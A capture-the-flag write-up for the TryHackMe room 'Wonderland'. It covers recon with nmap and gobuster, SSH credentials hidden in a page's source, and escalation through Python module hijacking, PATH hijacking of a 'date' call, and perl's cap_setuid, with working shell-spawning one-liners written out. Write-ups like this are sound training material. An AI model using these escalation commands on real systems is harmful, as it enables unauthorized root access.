# Wonderland \ TryHackme
difficulty : medium
# 1- Recon:
first of all i will scan for open ports using :
```
nmap -sC -sV -T4 -Pn 10.130.170.123
```
output : 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
we got http and ssh , i will check the http page.
nothing special , i'm going to run gobuster and see 
so i found something fun navigating through directories:
```
[nexsis@archlinux wonderland]$ gobuster dir -u http://10.130.170.123/ -w /home/nexsis/Desktop/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.130.170.123/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/nexsis/Desktop/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
img                  (Status: 301) [Size: 0] [--> img/]
index.html           (Status: 301) [Size: 0] [--> ./]
r                    (Status: 301) [Size: 0] [--> r/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```
it gave me the dir **r** so when i ran gobuster on http://10.130.170.123/r/ , then it gave me **a** the i did the same on http://10.130.170.123/r/a , then it gave me **b**
so i knew where it was going since the room is talking about a while -rabbit- so i ended up with http://10.130.170.123/r/a/b/b/i/t , i was stuck in here , then i inspected the pages source code in the browser usnig Ctrl+U , and i found some credentials here : 
```
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
```
since ssh port is open i used the credentials to log into ssh :
```
ssh alice@10.130.170.123
```
BOOM , we got a shell.
i found root.txt in home/alice , i took a wild guess and looked for the userflag in the root folder and guess what :
```
alice@wonderland:~$ cat /root/user.txt
thm{"#########!"}
```
## 2- Priv esc :
i used sudo -l , and noticed that alice has sudo perms in python , exactly the file walrus_and_the_carpenter.py  for user rabbit , I noticed the file doesn't have an absolute path for the first line where it imports the python module random. We can exploit this, and force it to load our own file instead.
the file doesn't have an absolute path for the first line where it imports the python module random , we can exploit this using : 
```
echo -e "import os\nos.system('/bin/bash')" > ~/random.py && sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
we got the shell to **rabbit**

now i went to rabbit's home folder and found a binary called **teaParty** , i noticed it calls `date` without an absolute path , same trick as before , i created a fake `date` file and put it first in PATH :
```
echo -e '#!/bin/bash\n/bin/bash' > /home/rabbit/date
chmod +x /home/rabbit/date
export PATH=/home/rabbit:$PATH
./teaParty
```
BOOM , we got the shell to **hatter**

i went to hatter's home folder and found a password file :
```
hatter@wonderland:/home/hatter$ cat password.txt
WhyIsARavenLikeAWritingDesk?
```
i used it to ssh in cleanly as hatter :
```
ssh hatter@10.130.170.123
```

now for root , i checked for binaries with special capabilities :
```
getcap -r / 2>/dev/null
```
output :
```
/usr/bin/perl = cap_setuid+ep
```
perl has cap_setuid , meaning it can set its UID to 0 (root) , i exploited this using :
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
BOOM , we got root !

now i can read the root flag :
```
# cat /home/alice/root.txt
thm{"#########!"}
```
